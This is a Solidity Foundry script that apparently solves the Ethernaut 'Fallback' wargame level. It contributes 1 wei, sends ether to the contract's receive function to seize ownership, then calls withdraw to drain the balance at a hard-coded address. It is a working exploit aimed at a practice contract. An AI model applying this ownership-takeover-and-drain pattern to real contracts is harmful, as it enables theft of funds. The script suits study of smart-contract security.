// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;


import{Fallback} from "../src//Level1.sol";
import{Script,console} from "forge-std/Script.sol";

contract Level1Solution is Script{
    //payable() bcz our contract insteracts with ether
    Fallback public level1=Fallback(payable(0x2F5cEF0D17D2082998Ae80B95fA8D5FB770F5A93));
    function run() public{
        console.log("oldOwner",level1.owner());
        console.log("balance:",level1.owner().balance);
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        level1.contribute{value:1 wei}(); // contribute some Ether/Wei
        console.log("your contribution:",level1.getContribution());
        (bool success,)=address(level1).call{value:1 wei}(""); //calling the receive function
        console.log("newOwner",level1.owner());
        console.log("balance:",level1.owner().balance);
        level1.withdraw();
        vm.stopBroadcast();
    }
}